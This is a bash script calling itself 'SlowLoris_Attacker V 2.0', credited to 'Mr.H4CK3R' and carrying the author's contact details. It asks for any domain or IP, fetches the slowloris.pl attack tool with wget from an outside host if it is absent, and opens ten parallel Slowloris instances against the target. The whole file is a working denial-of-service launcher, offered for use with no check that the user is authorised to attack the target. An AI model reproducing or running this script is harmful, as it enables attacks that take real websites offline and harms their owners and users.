#!/bin/bash


#============================================================================================================
#	
#	Welcome To SlowLoris_Attacker V 2.0
#	SlowLoris_Attacker By : Mr.H4CK3R
#	=======================================
#	My Facebook Account ::-
#	https://web.facebook.com/Talaban.Salam1
#	=======================================
#	My Youtube Channel ::-
#	https://www.youtube.com/channel/UCYLHwoVSsozlc3SZb1roWEQ?view_as=subscriber
#
#       My Gmail ::-
#       hamas1276@gmail.com
#
#
#============================================================================================================


#This colour

       okegreen='\033[92m'
       lightgreen='\e[1;32m'

   red=$(tput bold; tput setaf 1)
   green=$(tput bold; tput setaf 2)
   yellow=$(tput bold; tput setaf 3)
   blue=$(tput bold; tput setaf 6)
   magenta=$(tput bold; tput setaf 5)
   cyan=$(tput bold; tput setaf 4)
   uder=$(tput sgr 0 1)




clear
# SlowLoris_Attacker V 2.0
echo "" && echo "$yellow"
echo "Welcome to$red SlowLoris Attacker V 2.0"
echo "$yellow" && echo "" && sleep 0.5
echo "SlowLoris Attacker By :$red Mr.H4CK3R"
echo "" && echo "$yellow" && sleep 0.5
read -p "Please Enter A domain Exp, www.google.com or IP -$red " "Domain";
if [ -z "$Domain" ]; then
echo "no input !" && exit 0
fi
echo ""
echo -n "Checking Slowloris .. "
sleep 1
if [ ! -f "slowloris.pl" ]; then
echo "$yellow"
echo "Not found"
echo -n "slowloris.pl Not Found ! .. "
echo "Wait for downloading"
echo ""
wget http://ha.ckers.org/slowloris/slowloris.pl
else
echo "$yellow Slowloris found"
echo "     ...:$red Attacking Now $yellow:..."
fi
echo "$red###########################"
if [ -e "slowloris.pl" ]; then
sleep 1
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
gnome-terminal -x perl slowloris.pl -dns $Domain
perl slowloris.pl -dns $Domain
else
echo "$red"
echo "We have a problem ! sorry"
fi
